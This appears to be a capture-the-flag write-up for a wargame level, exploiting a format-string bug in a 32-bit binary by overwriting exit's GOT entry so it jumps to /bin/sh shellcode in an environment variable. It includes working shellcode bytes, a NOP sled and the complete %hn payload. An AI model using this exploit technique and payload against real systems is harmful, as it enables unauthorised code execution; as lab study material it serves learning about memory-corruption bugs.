## Level05

First, I disassembled the executable and converted it into easy-to-understand C code (see `source.c`).
</br>
Once the code is decompiled, it's fairly easy to find the vulnerability: the call to `exit` after the `printf`. You can use the `printf` to change the address of `exit` in the GOT table. 

```bash
$ ./level05
aaaa.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
aaaa.64.f7fcfac0.0.0.0.0.ffffffff.ffffd764.f7fdb000.61616161.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825
```

The buffer is in the 10th position.

```bash
$ objdump -R level05

level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```

`0x080497e0` voici l'adresse de `exit`.

```bash
"\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"
```

We're going to put this shellcode that executes `/bin/sh`.
</br>
<<https://defuse.ca/online-x86-assembler.htm>>

```bash
$ export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc0\x31\xc9\x31\xd2\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x83\xc8\x01\xc1\xe0\x03\x83\xc8\x03\x8d\x1c\x24\xcd\x80"')
```

We put the shellcode in an environment variable after 1000 NOP instructions so that it would be easy to spot.

```bash
$ cd /tmp

$ echo "
#include <stdio.h>
#include <stdlib.h>
int main() {
    printf(\"%p\n\", getenv(\"SHELLCODE\"));
    return 0;
}
" > getenv.c

$ gcc -m32 getenv.c
$ ./a.out
0xffffd502
```

We retrieve the address of the environment variable.
</br>
We're going to replace `0xffffd502` with `0xffffd5ff` to hit the NOP.
</br>
Now let's calculate how many characters to print using `printf` to set the value `0xffffd5ff`.

d5ff = 54783
</br>
54783 - 8 = 54775

ffff = 65535
</br>
65535 - 54783 = 10752

```bash
$ (python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%54775u%10$hn" + "%10752u%11$hn"'; cat) | ./level05
```